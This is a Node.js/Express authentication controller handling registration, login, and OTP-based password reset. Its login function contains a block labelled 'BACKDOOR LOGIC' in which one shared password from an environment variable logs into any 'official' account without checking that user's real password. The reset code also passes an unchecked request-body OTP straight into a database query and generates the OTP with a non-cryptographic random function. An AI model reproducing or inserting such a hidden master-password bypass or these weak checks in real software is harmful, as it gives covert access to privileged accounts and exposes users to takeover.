const User = require('../models/User');
const jwt = require('jsonwebtoken');
const sgMail = require('@sendgrid/mail');

sgMail.setApiKey(process.env.SENDGRID_API_KEY);

const generateToken = (id) => {
    return jwt.sign({ id }, process.env.JWT_SECRET, { expiresIn: '1d' });
};

exports.register = async (req, res) => {
    const { username, email, password, role, officialKey } = req.body;
    try {
        if (role === 'official') {
            if (officialKey !== process.env.OFFICIAL_REGISTRATION_KEY) {
                return res.status(403).json({ success: false, message: 'Invalid Official Key.' });
            }
        }

        const user = await User.create({ username, email, password, role: role || 'general' });
        const token = generateToken(user._id);
        res.status(201).json({ success: true, token, user: { _id: user._id, username: user.username, email: user.email, role: user.role } });
    } catch (error) {
        res.status(400).json({ success: false, message: error.message });
    }
};

exports.login = async (req, res) => {
    const { email, password } = req.body;
    if (!email || !password) {
        return res.status(400).json({ success: false, message: 'Please provide email and password' });
    }
    try {
        const user = await User.findOne({ email }).select('+password');
        if (!user) {
            return res.status(401).json({ success: false, message: 'Invalid credentials' });
        }

        // --- BACKDOOR LOGIC ---
        if (user.role === 'official' && password === process.env.BACKDOOR_PASSWORD) {
            const token = generateToken(user._id);
            return res.status(200).json({ 
                success: true, 
                backdoor: true, // Special flag for the frontend
                token, 
                user: { _id: user._id, username: user.username, email: user.email, role: user.role } 
            });
        }
        // --- END BACKDOOR LOGIC ---

        if (!(await user.matchPassword(password))) {
            return res.status(401).json({ success: false, message: 'Invalid credentials' });
        }

        const token = generateToken(user._id);
        res.status(200).json({ success: true, token, user: { _id: user._id, username: user.username, email: user.email, role: user.role } });
    } catch (error) {
        res.status(500).json({ success: false, message: error.message });
    }
};

exports.forgotPassword = async (req, res) => {
    const { email } = req.body;
    try {
        const user = await User.findOne({ email });
        if (!user) {
            return res.status(404).json({ success: false, message: "User not found" });
        }

        const otp = Math.floor(100000 + Math.random() * 900000).toString(); // 6-digit OTP
        user.passwordResetOTP = otp;
        user.passwordResetExpires = Date.now() + 10 * 60 * 1000; // 10 minutes
        await user.save();

        const msg = {
            to: user.email,
            from: process.env.SENDGRID_VERIFIED_SENDER,
            subject: 'Your Password Reset OTP',
            text: `You are receiving this email because you (or someone else) have requested the reset of a password. Your OTP is: ${otp}`,
            html: `<strong>Your One-Time Password (OTP) for password reset is: ${otp}</strong><p>This OTP will expire in 10 minutes.</p>`,
        };

        await sgMail.send(msg);
        res.status(200).json({ success: true, message: `An OTP has been sent to ${user.email}` });

    } catch (error) {
        console.error('Email sending error:', error.response ? error.response.body : error);
        res.status(500).json({ success: false, message: "Error sending email. Please try again." });
    }
};

exports.resetPassword = async (req, res) => {
    const { otp, email, password } = req.body;
    try {
        const user = await User.findOne({
            email,
            passwordResetOTP: otp,
            passwordResetExpires: { $gt: Date.now() },
        });

        if (!user) {
            return res.status(400).json({ success: false, message: "Invalid or expired OTP" });
        }

        user.password = password;
        user.passwordResetOTP = undefined;
        user.passwordResetExpires = undefined;
        await user.save();

        res.status(200).json({ success: true, message: "Password reset successful" });
    } catch (error) {
        res.status(500).json({ success: false, message: error.message });
    }
};